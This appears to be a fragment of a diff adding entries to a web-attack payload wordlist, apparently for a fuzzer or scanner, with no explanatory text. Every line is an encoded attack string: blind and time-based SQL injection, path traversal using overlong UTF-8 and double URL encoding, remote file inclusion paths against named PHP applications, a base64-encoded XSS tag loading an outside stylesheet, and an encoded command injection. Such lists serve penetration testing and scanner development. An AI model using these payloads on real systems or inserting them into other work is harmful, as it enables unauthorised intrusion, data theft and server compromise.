2527%253D%2527%2569
+'%0Dand%0D1%0Ain%0D(select%0Cvar%09from%0Dtemp)--
+/Somery/team.php?checkauth=XXpathXX-- sp_password
+%C0%AFvisible%C0%DFcount%C0%DFinc%C0%AEphp%C0%BFstatitpath%C0%BFXXpathXX
+Jmx0O01FVEEgSFRUUC1FUVVJVj1cIkxpbmtcIiBDb250ZW50PVwiJmx0O2h0dHAmIzU4Oy8vaGEmIzQ2O2NrZXJzJiM0NjtvcmcveHNzJiM0Njtjc3MmZ3Q7OyBSRUw9c3R5bGVzaGVldFwiJmd0Ow==
+%/%.%\%.%\%.%\%.%\%.%\%.%\%.%\%.%\%.%\%.%\%.%\%.%\%.%\%.%\%.%\%.%\%.%\%.%\%.%\%.%\%.%\%.%\%.%\%.%\%.%\%.%\%.%\%.%\%.%\%.%\%.%\%.%\%.%\%.%\%.%\%.%\%.%\%.%\%.%\%.%\%.%\%.%\%.%\%.%\%.%\%.%\%.%\%.%\%.%\%.%\%.%\%.%\%.%\%.%\%.%\%.%\%.%\%.%\%.%\%.%\%.%\%.%\%.%\%.%\%.%\%.%\%.%\%.%\%.%\%.%\%.%\%.%\%.%\%.%\%.%\%.%\%.%\%.%\%.%\%.%\%.%\%.%\%.%\%.%\%.%\%.%\%.%\%.%\%.%\%.%\%.%\%.%\%.%\%.%\%.%\%.%\%.%\%.%\%.%\%.%\%.%\%.%\%.%\%.%\%.%\%.%\%.%\%.%\%.%\%.%\%.%\%.%\%.%\%.%\%.%\%.%\%.%\%.%\%.%\%.%\%.%\%.%\%.%\%.%\%.%\%.%\%.%\%.%\%.%\%.%\%.%\%.%\%.%\%.%\%.%\%.%\%.%\%.%\%.%\%.%\%.%\%.%\%.%\%.%\%.%\%.%\%.%\%.%\%.%\%.%\%.%.%\%.%.%\%.%.%\%.%.%\%.%.%\%.%.%\%.%.%\%{%F%I%L%E%}
+1%C0%AAand%C0%AA1%C0%BF1
+")))--smTvbAblhV%0Aand--uehyjz%0A0=benchmark(3000000,MD5(1))%20%23
+%/%.%.%.%.%\%.%.%.%.%\%.%.%.%.%\%.%.%.%.%\%.%.%.%.%\%.%.%.%.%\%{%F%I%L%E%}
+/rspa/framework/Controller_v4.php?__ClassPath LIKE XXpathXX
+/%c0%ae%c0%ae\%c0%ae%c0%ae\{FILE}%00
+%252F%2565%256C%2573%2565%2569%2566%252F%2575%2574%2569%256C%2569%2573%2561%2574%2565%2575%2572%2573%252F%2565%2573%2570%2561%2563%2565%2570%2565%2572%2573%256F%252E%2570%2568%2570%253F%2574%2570%2565%256C%2573%2565%2569%2566%2570%256F%2572%2574%2561%256C%2572%2565%2570%2565%2572%2574%256F%2569%2572%2565%253D%2558%2558%2570%2561%2574%2568%2558%2558
+/help_text_vars.php?cmd=dir&PGV_BASE_DIRECTORY=XXpathXX%00
+select    system_user    from   sysibm.sysdummy1;
+%'%; %i%f %n%o%t%(%s%u%b%s%t%r%i%n%g%(%(%s%e%l%e%c%t %@%@%v%e%r%s%i%o%n%)%,%2%4%,%1%) %<%> %1%) %w%a%i%t%f%o%r %d%e%l%a%y %'%0%:%0%:%2%' %-%-
+%C0%AFinc%C0%AFnuke%C0%DFinclude%C0%AEphp%C0%BFnewsSync%C0%DFenable%C0%DFphpnuke%C0%DFmod%C0%BF1%C0%AEnewsSync%C0%DFNUKE%C0%DFPATH%C0%BFXXpathXX%C0%BF
+%u002F%u0070%u0072%u0065%u0076%u0069%u0065%u0077%u002E%u0070%u0068%u0070%u003F%u0070%u0068%u0070%u005F%u0073%u0063%u0072%u0069%u0070%u0074%u005F%u0070%u0061%u0074%u0068%u003D%u0058%u0058%u0070%u0061%u0074%u0068%u0058%u0058%u003F%u0026%u0063%u006D%u0064%u003D%u0064%u0069%u0072
+/include/cls_viewpastorders.php?INCLUDE_PATH=XXpathXX%00
+%&%#%X%3%c%;
+%C0%CA%C0%AA
+%257C%2520%2570%2569%256E%2567%2520%252D%256E%2520%2533%2530%2520%2531%2532%2537%252E%2530%252E%2530%252E%2531%2520%257C
+%2F%6D%61%6E%61%67%65%72%2F%61%72%74%69%63%6C%65%73%2E%70%68%70%3F%5F%50%58%5F%63%6F%6E%66%69%67%5B%6D%61%6E%61%67%65%72%5F%70%61%74%68%5D%3D%58%58%70%61%74%68%58%58
+%2F%2E%2E%2E%2E%2F%2E%2E%2E%2E%2F%7B%46%49%4C%45%7D
+/0x2e0x2e\0x2e0x2e\0x2e0x2e\0x2e0x2e\0x2e0x2e\0x2e0x2e\0x2e0x2e\0x2e0x2e\{FILE}-- sp_password
